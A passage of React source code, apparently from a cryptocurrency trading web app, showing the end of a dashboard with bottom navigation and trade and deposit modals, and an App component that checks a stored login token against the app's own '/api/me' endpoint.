            </button>

            <button onClick={onLogout} style={{width:"100%",padding:"11px 0",borderRadius:10,border:`1px solid ${C.border}`,background:"transparent",color:C.red,fontWeight:700,fontSize:13,cursor:"pointer"}}>
              Sign Out
            </button>
          </div>
        )}
      </div>

      <div style={{position:"fixed",bottom:0,left:0,right:0,background:"#040A15",borderTop:`1px solid ${C.border}`,display:"flex"}}>
        {navBtn("market","Market","📈")}
        {navBtn("portfolio","Portfolio","💼")}
        {navBtn("history","History","📋")}
        {navBtn("account","Account","👤")}
      </div>

      <ToastStack toasts={toasts}/>
      {tradeCrypto&&<TradeModal crypto={tradeCrypto} user={{balance,portfolio}} onClose={()=>setTradeCrypto(null)} onTrade={onTrade}/>}
      {showDeposit&&<DepositModal onClose={()=>setShowDeposit(false)}/>}
    </div>
  );
}

export default function App() {
  const [user, setUser] = useState(null);
  const [authChecked, setAuthChecked] = useState(false);

  useEffect(() => {
    const token = localStorage.getItem("afm_token");
    if(!token) return setAuthChecked(true);
    fetch("/api/me", {headers:{Authorization:`Bearer ${token}`}})
      .then(r=>r.ok?r.json():Promise.reject())
      .then(data=>setUser(data.user))
      .catch(()=>localStorage.removeItem("afm_token"))
      .finally(()=>setAuthChecked(true));
  }, []);

  if(!authChecked) return <div style={{minHeight:"100vh",background:C.bg,display:"flex",alignItems:"center",justifyContent:"center",color:C.muted}}>Loading...</div>;
  if(!user) return <LoginPage onAuth={setUser}/>;

  return <Dashboard user={user} setUser={setUser} onLogout={()=>{localStorage.removeItem("afm_token");setUser(null);}} />;
                      }
